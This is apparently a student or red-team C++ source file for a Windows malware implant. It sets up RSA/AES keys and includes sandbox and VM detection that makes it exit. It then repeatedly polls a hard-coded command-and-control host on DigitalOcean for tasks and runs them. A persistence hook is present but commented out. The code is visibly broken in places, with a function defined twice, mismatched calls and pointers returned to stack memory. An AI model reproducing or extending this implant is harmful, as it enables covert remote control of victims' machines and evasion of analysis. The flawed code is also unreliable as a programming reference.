/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <future>
#include <cmath>

#include "persist/persist.h"
#include "parse/parse.h"
#include "Feiyu/sandbox_detection.h"
#include "execute/execute.h"

#include "..\nlohmann\json.hpp"

using json = nlohmann::json;
// current compile line is - g++ implant.cpp persist/persist.cpp parse/parse.cpp -lwinhttp -lbcrypt -static -o implant.exe 

// I think this is putting in the sandbox_detection
// g++ implant.cpp persist.cpp parse.cpp Feiyu/sandbox_detection.cpp -lwinhttp -lbcrypt -static -o implant.exe

#define SERVERNAME "placeholder"
#define SLEEP 60000
#define serverpublickey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzx4uIFIDB0pWvgR/JxYiS1CFOgxV4zWWprRE/Te48cZSC49SHXAya/gKIHO66/7I1yFNiuLhcqtuDx2Pt1fSK1Hw2neXkFRnbGDJXLkGldGe+7Uqjw1XrTT24QXRjAFE/jmVm3FtvrsHloSQZO5mvrHOzHsd+AH4i/HK3rDQ7U6vgQfroPpShD2mK6HPYsQxHTTiz+SMGD3VpG49aUk7YLxR2pfVA/x7vo7MLXDwYI2znwMcu0C5MweN4f7x7C0aop6qFQZVef1/2TbdeSEdri6oWAkwFWA8PCiQaIXvrnjOgm4zMDtFE3CHbcl335ArDQoeCPdeFjIIubGOlUfmAFHJ7Xntb/q2mgDz3VZ9ox7Jzd/ZktrODVyO8VTL3Wt4nQx48fSNU8bWfrTlrKmXwA/2+mvhNjFBRF6R5a7JztsrZkQ1Y1FbMstkw1+Q80mLsLowAfE2VerKjCd7484XXpDtvEdaPkPiYgfRTotrhkkpkcKlLCvdArbNxDnkv328= sumthing"

std::vector<json> Results;

size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
{
    data->append((char *)ptr, size * nmemb);
    return size * nmemb;
}

void tasks()
{
    while (1)
    {
        Sleep(SLEEP);
    }
}

BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput, ULONG pbinputsize)
{
    BCRYPT_ALG_HANDLE rsahandle;
    BCryptOpenAlgorithmProvider(&rsahandle, BCRYPT_RSA_ALGORITHM, NULL, 0);
    BCRYPT_KEY_HANDLE outro = new BCRYPT_KEY_HANDLE;
    BCryptImportKeyPair(rsahandle, NULL, BCRYPT_RSAPUBLIC_BLOB, &outro, pbinnput, pbinputsize, BCRYPT_NO_KEY_VALIDATION);
    return outro;
}
PUCHAR rsaEncrypt(BCRYPT_KEY_HANDLE rsakeyhandle, PUCHAR symkey, ULONG symkeysize)
{
    // Function adapted from https://stackoverflow.com/questions/58419870/how-to-use-bcrypt-for-rsa-asymmetric-encryption
    ULONG encbuffersize;
    NTSTATUS status = BCryptEncrypt(rsakeyhandle, symkey, symkeysize,NULL,NULL,0,NULL,0,&encbuffersize,0);
    PUCHAR encbuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encbuffersize);
    if (encbuffer == NULL)
    {
        printf("failed to allocate memory for blindedFEKBuffer\n");
    }
    BCryptEncrypt(rsakeyhandle, symkey, symkeysize, NULL, NULL, 0, encbuffer, encbuffersize, &encbuffersize, 0);
    return encbuffer;
}
char *getsecret()
{
    char *secret = (char *)malloc(8);
    std::string alphabet = "abcdefghijklmonpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    unsigned int ms = std::time(nullptr);
    double mod = 61;
    srand(ms);
    for (int i = 0; i < 8; i++)
    {
        if (i == 4)
        {
            srand(ms + 1);
        }
        int randomvalue = std::fmod(rand(), mod);
        secret[i] = alphabet[randomvalue];
    }
    return secret;
}

BCRYPT_KEY_HANDLE newsymkey()
{
    BCRYPT_ALG_HANDLE ahandle;
    BCRYPT_KEY_HANDLE symkeyhandle;
    ULONG symkeypropertylen;
    ULONG bytescopied;
    BCryptOpenAlgorithmProvider(&ahandle, BCRYPT_AES_GMAC_ALGORITHM, NULL, 0);

    BCryptGetProperty(ahandle, BCRYPT_KEY_LENGTH, NULL, 0, &symkeypropertylen, 0);
    PUCHAR symkeylen = (PUCHAR)malloc(symkeypropertylen);
    BCryptGetProperty(ahandle, BCRYPT_KEY_LENGTH, symkeylen, symkeypropertylen, &bytescopied, 0);
    char *secret = getsecret();
    BCryptGenerateSymmetricKey(ahandle, &symkeyhandle, NULL, 0, (PUCHAR)secret, 8, 0);
    free(symkeylen);
    return symkeyhandle;
}

ULONG getkeysize(BCRYPT_KEY_HANDLE symkeyhandle){
    //Get datablob required size
    ULONG blobsize;
    BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,NULL,0,&blobsize,0);
    return blobsize;
}

BLOB* getkeytext(BCRYPT_KEY_HANDLE symkeyhandle,ULONG blobsize){
    //Make blob, export key to blob
    BLOB* keyblob=(BLOB*)malloc(blobsize);
    BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,(PUCHAR)keyblob,blobsize,&blobsize,0);
    return keyblob;
}

std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int implant_id)
{
    // Used Windows documentation for every function
    int temp = 0;
    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
    if (implant_id > 10)
    {
        temp = 2;
    }
    else
    {
        temp = 1;
    }
    int length = 7 + temp;
    char postdata[11];
    sprintf(postdata, "{\"id\":%d}", implant_id);

    LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";

    /* Converts from string to wstring to LPCWSTR
       https://stackoverflow.com/questions/27220/how-to-convert-stdstring-to-lpcwstr-in-c-unicode
    */
    std::string result;
    std::wstring fqdn_wstring(fqdn.begin(), fqdn.end());
    LPCWSTR fqdnptr = fqdn_wstring.c_str();

    // The WinHttpOpen function initializes, for an application, the use of WinHTTP functions and returns a WinHTTP-session handle.
    HINTERNET hSession = WinHttpOpen(fqdnptr, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession)
    {
        return "WinHttpOpen Failed";
    }

    // The WinHttpConnect function specifies the initial target server of an HTTP request and returns an HINTERNET connection handle to an HTTP session for that initial target.
    HINTERNET hConnect = WinHttpConnect(hSession, fqdnptr, port, 0);

    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return "WinHttpConnect Failed";
    }

    // GET string for WinHttpOpenRequest
    std::string get = "POST";
    std::wstring get_wstring(get.begin(), get.end());
    LPCWSTR getptr = get_wstring.c_str();

    std::wstring get_uri(uri.begin(), uri.end());
    LPCWSTR uriptr = get_uri.c_str();

    // The WinHttpOpenRequest function creates an HTTP request handle.
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, getptr, uriptr, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    if (!hRequest)
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        return "WinHttpOpenRequest Failed";
    }
    // WinHttpAddRequestHeaders(hRequest, additionalHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);

    // The WinHttpSendRequest function sends the specified request to the HTTP server.
    if (!WinHttpSendRequest(hRequest, additionalHeaders, -1, postdata, length, length, 0))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpSendRequest Failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hSession);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return "WinHttpReceiveResponse Failed";
    }

    DWORD lpdwNumberOfBytesAvailable = 0;
    LPSTR lpBuffer = NULL;

    do
    {

        lpdwNumberOfBytesAvailable = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &lpdwNumberOfBytesAvailable))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpQueryDataAvailable Failed";
        }

        // Initializing Buffer with 4096 bytes
        lpBuffer = new char[4096];
        ZeroMemory(lpBuffer, 4096);

        DWORD lpdwNumberOfBytesRead = 0;

        if (!WinHttpReadData(hRequest, lpBuffer, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead))
        {
            WinHttpCloseHandle(hSession);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            return "WinHttpReadData Failed";
        }

        result = result + lpBuffer;
        delete[] lpBuffer;

    } while (lpdwNumberOfBytesAvailable > 0);

    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return result;
}


std::string getTasks(int implant_id)
{
    std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/get_commands", implant_id);
    return item;
}
LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
{
    DWORD datalen = strlen(postdata);
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (httpsession != NULL)
    {
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {


                if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
                    printf("YOU SET HEADER");
                }


                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    datalen,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if (response == true)
                    {
                        DWORD bytesneeded;
                        BOOL query = WinHttpQueryDataAvailable(
                            request,
                            &bytesneeded);
                        LPSTR returnbuffer = new char[bytesneeded + 1];
                        if (query == TRUE)
                        {
                            if (returnbuffer)
                            {
                                ZeroMemory(returnbuffer, bytesneeded + 1);
                                BOOL dataread = WinHttpReadData(
                                    request,
                                    returnbuffer,
                                    bytesneeded + 1,
                                    NULL);
                                if (dataread == TRUE)
                                {
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


void runLoop(int implant_id)
{
    int jitter;
    int i=0;
    BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)serverpublickey,(ULONG)562);
    BCRYPT_KEY_HANDLE symkey=newsymkey();
    ULONG symkeysize=getkeysize(symkey);
    BLOB* symkeytext=getkeytext(symkey,symkeysize);
    PUCHAR encbuffer=rsaEncrypt(rsakey,(PUCHAR) symkeytext,symkeysize);

    //char* encbuffer=rsaEncrypt(rsakey,);
    //register()

    //PERSISTANCE ONCE IMPLANT HAS BEEN MADE
    // PREFERABLY DO NOT TEST THIS ON YOUR MACHINE
    //persist_execution();

    // THIS IS FOR SANDBOX DETECTION TO RUN ONCE
    // WE NEED ONE IMPLANT COMPILE WITH THIS AND ONE IMPLANT COMPILE WITHOUT IT	
    if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
    	exit(0);
    }

    while (true)
    {
        try
        {
            i+=1;
            if(i==40){
                newsymkey(rsakey);
                i=0;
            }

            std::string getting = getTasks(implant_id);
      
            jitter = rand() * 10;
            Sleep(SLEEP + jitter);
            json commands = json::parse(getting);
            std::string jsonfile = "execute.json";
            std::ofstream o(jsonfile);
            o << commands << std::endl;
            o.close();

            parseTasks(jsonfile);

            executecommandfromfile();


        }
        catch (const std::exception &e)
        {
            printf("\nError in runLoop: %s\n", e.what());
        }

        // SET SLEEP HERE
    }
}

// INITIALLY MADE FOR RANDOM HEX - WE CAN CHANGE TO RANDOM INT
// IF WE CONTINUE TO USE RANDOM HEX - HTTP REQUEST NEEDS TO BE CHANGED

// Random Implant ID in hex using rand()
// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
char *random_id()
{
    char random_hex[32 + 1];
    char *random_hexptr = random_hex;

    srand(time(0));
    for (int i = 0; i < 32; i++)
    {
        sprintf(random_hex + i, "%x", rand() % 32);
    }

    return random_hexptr;
}

// INITIALLY MADE TO CREATE A POINTER TO AN IMPLANT ID STRING
// NOT SURE IF STILL NEEDED
char *make_base_payload(char *implant_id)
{
    char payload[51] = "{\"implant_id\": }";
    char *payloadptr = payload;
    strcat(payload, implant_id);
    return payloadptr;
}

int main(int argc, char *argv[])
{



    //int implant_id = get_id();
    int implant_id=0;
    
    runLoop(implant_id);
    return 0;
}

/* Code not used


LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if(httpsession!=NULL){
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"GET",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    NULL,
                    0,
                    0,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if(response==true)
                    {
                        DWORD bytesneeded;
                        BOOL query= WinHttpQueryDataAvailable(
                        request,
                        &bytesneeded);
                        LPSTR returnbuffer=new char[bytesneeded+1];
                        if(query==TRUE){
                            if(returnbuffer){
                                ZeroMemory(returnbuffer, bytesneeded+1);
                                BOOL dataread=WinHttpReadData(
                                request,
                                returnbuffer,
                                bytesneeded+1,
                                NULL);
                                if(dataread==TRUE){
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

 Code not used */
LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
{
    DWORD datalen = strlen(postdata);
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (httpsession != NULL)
    {
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {


                if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
                    printf("YOU SET HEADER");
                }


                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    datalen,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if (response == true)
                    {
                        DWORD bytesneeded;
                        BOOL query = WinHttpQueryDataAvailable(
                            request,
                            &bytesneeded);
                        LPSTR returnbuffer = new char[bytesneeded + 1];
                        if (query == TRUE)
                        {
                            if (returnbuffer)
                            {
                                ZeroMemory(returnbuffer, bytesneeded + 1);
                                BOOL dataread = WinHttpReadData(
                                    request,
                                    returnbuffer,
                                    bytesneeded + 1,
                                    NULL);
                                if (dataread == TRUE)
                                {
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
//symEncrypt(symkey,(PUCHAR) symkeytext,symkeysize);
//Assume symkey filled in and this func works